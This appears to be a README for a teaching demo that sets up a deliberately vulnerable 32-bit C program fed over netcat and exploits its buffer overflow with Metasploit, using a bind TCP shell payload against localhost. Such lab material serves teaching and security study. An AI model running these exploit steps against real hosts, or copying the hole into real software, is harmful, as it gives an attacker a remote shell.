# ijit
Simple buffer overflow demo, in the style of a Just-In-Time compiled (JIT) program.

Install metasploit and then check this code out to your modules directory:

```
mkdir -p ~/.msf4/modules/exploits/linux
cd ~/.msf4/modules/exploits/linux
git clone https://github.com/olawlor/ijit
```

Now run the vulnerable program (compiled here as a 32-bit x86 program):

```
gcc -m 32 ijit.c -o ijit32 && nc -l -p 8888 | ./ijit32
```

Leave the vulnerable program running.

Now exploit it with msfconsole:

```
msfconsole
use exploit/linux/ijit/ijit 
reload
set RHOST 127.0.0.1
set nop x86/single_byte
set payload linux/x86/shell/bind_tcp
exploit
```

